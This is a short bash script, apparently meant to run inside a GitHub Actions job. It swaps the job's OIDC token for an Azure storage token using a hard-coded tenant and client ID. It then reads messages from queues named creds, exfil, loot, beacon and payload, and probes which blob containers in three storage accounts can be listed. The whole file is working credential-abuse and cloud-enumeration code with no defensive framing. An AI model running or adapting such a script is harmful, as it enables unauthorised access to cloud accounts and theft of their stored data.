#!/usr/bin/env bash
GHJWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])')
tok(){ curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$GHJWT" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  --data-urlencode "scope=$1" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))'; }
STT=$(tok "https://storage.azure.com/.default")
SA=sttblcilogsprodx3euoz
for q in agent beacon creds dump exfil jobs loot lootqueue messages out payload results tasks work; do
  echo "===== $q"
  curl -sS -m 15 "https://$SA.queue.core.windows.net/$q/messages?numofmessages=32&peekonly=true" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06" | python3 -c 'import sys,re,base64;d=sys.stdin.read();[print("  ",(base64.b64decode(m).decode("utf-8","replace") if re.match(r"^[A-Za-z0-9+/=]+$",m) else m)[:300]) for m in re.findall(r"<MessageText>([^<]+)</MessageText>",d)]' 2>/dev/null | head -20
done
echo "=== also blob containers read test (perms per container) ==="
for c in config exports loot logs; do
  for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
    s=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "https://$sa.blob.core.windows.net/$c?restype=container&comp=list" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06")
    echo "$sa/$c list=$s"
  done
done
echo DONE
